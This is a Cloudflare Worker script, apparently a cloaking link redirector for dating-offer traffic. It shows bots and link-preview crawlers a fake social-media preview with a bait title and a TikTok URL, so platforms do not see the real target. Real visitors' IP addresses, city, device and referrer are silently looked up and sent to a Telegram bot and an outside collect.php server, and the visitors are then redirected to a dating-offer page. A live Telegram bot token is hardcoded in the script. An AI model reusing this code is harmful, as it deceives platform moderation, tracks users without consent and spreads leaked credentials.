addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  const subsource = url.searchParams.get('subsource') || 'WISNU'
  const ua = (request.headers.get('user-agent') || '').toLowerCase()
  const referer = request.headers.get('referer') || ''
  const chMobile = request.headers.get('sec-ch-ua-mobile') === '?1'
  const isMobile = chMobile || /Mobi|Android|iPhone|iPad/.test(ua)
  const connType = request.headers.get('sec-ch-ua-platform') || 'unknown'

  // Deteksi bot sosial media
  const socialBots = [
    'facebookexternalhit', 'twitterbot', 'linkedinbot', 'slackbot', 'discordbot',
    'whatsapp', 'telegrambot', 'pinterest', 'vkshare', 'instagram', 'skypeuripreview',
    'outlook', 'nimbuzz', 'viber', 'line', 'googleplus', 'applebot', 'yahooseeker',
    'flipboard', 'tumblr', 'redditbot', 'quora link preview', 'bitlybot', 'smtbot',
    'sogou web spider', 'sogou inst spider', 'sogou orion spider', 'mj12bot', 'ahrefsbot',
    'semrushbot', 'dotbot', 'gigabot', 'ia_archiver', 'pingdom', 'crawler', 'spider',
    'preview', 'bot', 'curl', 'wget', 'python-requests', 'okhttp', 'java', 'libwww-perl'
  ]
  const isSocialBot = socialBots.some(bot => ua.includes(bot))

  if (isSocialBot) {
    // Custom preview untuk sosial media
    const og_title = 'No matter where you live'
    const og_desc = 'Find me now'
    const og_image = 'https://i.imgur.com/N6DYnbg.jpeg'
    const og_site_name = 'Secret Network'
    const og_url = 'https://tiktok.com'
    return new Response(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta property="og:title" content="${og_title}">
        <meta property="og:description" content="${og_desc}">
        <meta property="og:image" content="${og_image}">
        <meta property="og:site_name" content="${og_site_name}">
        <meta property="og:type" content="website">
        <meta property="og:locale" content="en_US">
        <meta property="og:image:width" content="800">
        <meta property="og:image:height" content="1000">
        <meta property="og:url" content="${og_url}">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content="${og_title}">
        <meta name="twitter:description" content="${og_desc}">
        <meta name="twitter:image" content="${og_image}">
        <title>${og_title}</title>
      </head>
      <body></body>
      </html>
    `, { headers: { 'content-type': 'text/html' } })
  }

  // Ambil IP pengunjung dari header (Cloudflare)
  const ip = request.headers.get('cf-connecting-ip') || '8.8.8.8' // fallback untuk debug

  // Panggil ipinfo.io
  let country = 'Unknown', city = '', carrier = '', proxy = 'NO', connection = '', geo = {}, region = '', loc = '', org = '', tz = ''
  try {
    if (ip) {
      const ipinfoRes = await fetch(`https://ipinfo.io/${ip}?token=3cd978eebcd25a`)
      if (ipinfoRes.ok) {
        geo = await ipinfoRes.json()
        country = geo.country || 'Unknown'
        city = geo.city || ''
        region = geo.region || ''
        loc = geo.loc || ''
        org = geo.org || ''
        tz = geo.timezone || ''
        carrier = geo.org || ''
        proxy = (geo.privacy && (geo.privacy.proxy || geo.privacy.vpn || geo.privacy.tor)) ? 'YES' : 'NO'
      }
    }
  } catch (e) {
    // fallback jika error
  }

  // Kirim notifikasi ke Telegram
  try {
    const telegramToken = '8142648788:AAGk-vCVwZY7fzpwVLUSMwBlZ33hfKSKAmU';
    const channelId = '-1002670859549';
    const date = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });
    const message = `🔔 New Visitor\n📅 Date: ${date}\n🌐 IP: ${ip}\n🏳️ Country: ${country}\n🏙️ City: ${city}\n📱 Device: ${isMobile}\n🔗 Referrer: ${referer}\n🔑 Subsource: ${subsource}`;
    await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: channelId, text: message })
    });
  } catch (e) {
    // Jangan crash jika error Telegram
  }

  // Kirim statistik ke backend collect.php (API lama di domain baru)
  try {
    await fetch('https://cpa.jobsy.biz.id/api/collect.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        ip,
        city,
        region,
        country,
        loc,
        org,
        tz,
        ua,
        referer,
        is_mobile: isMobile ? 1 : 0,
        connection_type: connType,
        subsource,
        ts: new Date().toISOString()
      })
    })
  } catch (e) {
    // Jangan crash jika error
  }

  // Ambil path shortlink dari URL
  const path = url.pathname // misal: /Tatum8765/RtxXkq7MSFSt

  // Redirect ke URL tujuan sesuai pola
  const target = `https://dfhdaf.newdatesclub.com/s/08907c40f0e47?sub1=${encodeURIComponent(subsource)}&subsource=${encodeURIComponent(subsource)}&ext_click_id=${encodeURIComponent(subsource)}`
  return Response.redirect(target, 302)
}